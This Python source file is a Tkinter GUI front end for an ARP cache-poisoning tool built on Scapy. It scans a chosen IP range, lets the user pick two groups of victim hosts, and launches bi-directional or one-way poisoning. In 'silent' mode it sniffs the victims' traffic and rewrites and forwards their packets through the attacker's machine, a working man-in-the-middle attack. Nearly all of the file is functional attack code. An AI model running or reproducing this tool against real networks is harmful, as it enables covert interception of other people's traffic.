from scapy.all import *
from poisoning import poisoning
import threading
from Tkinter import*
import sys
import os


class arp():

    def __init__(self, interface, root):
        self.interface = interface
        self.root = root

    def input_finished(self):
        proc_thread = None
        proc_thread = threading.Thread(target=self.startProcess)
        proc_thread.daemon = True
        proc_thread.start()

    def select_silent(self):
        for widget in self.root.winfo_children():
            widget.destroy()

        def change_silent(self, s):
            self.mode = ""
            self.mode = s
            self.input_finished()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Label(self.root, text='Choose between silent and loud poisoning').pack()
        Button(self.root, text="Select silent poisoning", command=lambda: change_silent(self, "silent")).pack()
        Button(self.root, text="Select loud poisoning", command=lambda: change_silent(self, "loud")).pack()

    def select_direction(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        self.ownMAC = get_if_hwaddr(self.interface)
        for widget in self.root.winfo_children():
            widget.destroy()

        def change_value(self, s):
            self.direction = s
            self.select_silent()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Label(self.root, text='Choose which type of directional attack you want to execute').pack()
        Button(self.root, text="Select bi-directional poisoning", command=lambda: change_value(self, "y")).pack()
        Button(self.root, text="Select directional poisoning", command=lambda: change_value(self, "n")).pack()

    def select_target_ip(self):
        self.target2 = []
        for widget in self.root.winfo_children():
            widget.destroy()
        OPTIONS = []
        for packet_sent, packet_received in self.ips_used:
            OPTIONS.append(packet_received[ARP].psrc)
        Label(self.root, text='Select one or more target2 IPs (can select all of them)').pack()
        selectTargetIP = Listbox(self.root, selectmode="multiple", width=100)
        for each_item in range(len(OPTIONS)):
            selectTargetIP.insert(END, OPTIONS[each_item])
        selectTargetIP.pack()

        def get_target(self):
            for i in selectTargetIP.curselection():
                inputInt = int(i)
                self.target2.append(
                    {"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
            self.select_direction()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_target(self)).pack()

    def select_arp_IP(self):
        self.target = []
        Label(self.root, text='Select one or more target IPs (can select all of them)').pack()
        OPTIONS = []
        for packet_sent, packet_received in self.ips_used:
            OPTIONS.append(packet_received[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=100)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()

        def get_select(self):
            for i in select.curselection():
                inputInt = int(i)
                self.target.append(
                    {"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
            self.select_target_ip()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()

    def get_IP(self):
        ipLabel = Label(self.root,
                        text='Enter the range of IP addresses that you want to use (example: 192.168.5.85/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.ip_range = ipValue.get()
            self.ips_used, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.ip_range), timeout=3,
                                   iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.select_arp_IP()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()

    def getInput(self):
        self.get_IP()

    def startProcess(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        scroll = Scrollbar(self.root)
        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.eula.yview)
        self.eula.pack()
        self.eula.insert(END, "ARP poisoning has started" + '\n')
        self.eula.see(END)
        self.eula.update_idletasks()
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        # Now we will create and send the arp packets which will poison the caches.
        proc_thread = None
        process = poisoning(self.interface, self.target, self.target2, self.ownMAC, self.direction)
        proc_thread = threading.Thread(target=process.poisoning)
        proc_thread.daemon = True
        proc_thread.start()
        # now we will redirect packets correctly -> do not enable port forwarding on your device
        if (self.mode == "silent"):
            while True:
                sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)

    def packetForwarding(self, packet):
        # first we should check whether the packet satisfies the most basic requirement of having the IP + ether layer
        if (self.mode == "silent"):
            if packet.haslayer(Ether) and packet.haslayer(IP):
                sender = None
                senderfound = False
                receiver = None
                receiverfound = False
                # Finds the sender to be in target or target2 set
                for tar1 in self.target:
                    if (tar1["mac"] == packet[Ether].src):
                        sender = tar1
                        senderfound = True
                        for tar2 in self.target2:
                            if (tar2["ip"] == packet[IP].dst):
                                receiver = tar2
                                receiverfound = True
                if ((not senderfound) or (not receiverfound)):
                    for tar2 in self.target2:
                        if (tar2["mac"] == packet[Ether].src):
                            sender = tar2
                            senderfound = True
                            for tar1 in self.target:
                                if (tar1["ip"] == packet[IP].dst):
                                    receiver = tar1
                                    receiverfound = True
                # now we will modify the packet and forward it
                if (senderfound and receiverfound):
                    packet[Ether].src = self.ownMAC
                    packet[Ether].dst = receiver["mac"]
                    sendp(packet, iface=self.interface, verbose=False)
                    self.eula.insert(END, "we redirect packet from ip: {}, mac: {}, to ip: {}, mac: {}".format(sender["ip"], sender["mac"],
                                                                                           receiver["ip"],
                                                                                           receiver["mac"]) + '\n')
                    self.eula.see(END)
                    self.eula.update_idletasks()

    def setInput(self, ip_range, ips_used, target, target2, ownMAC, direction, mode):
        self.ip_range = ip_range
        self.ips_used = ips_used
        self.target = target
        self.target2 = target2
        self.ownMAC = ownMAC
        self.direction = direction
        self.mode = mode
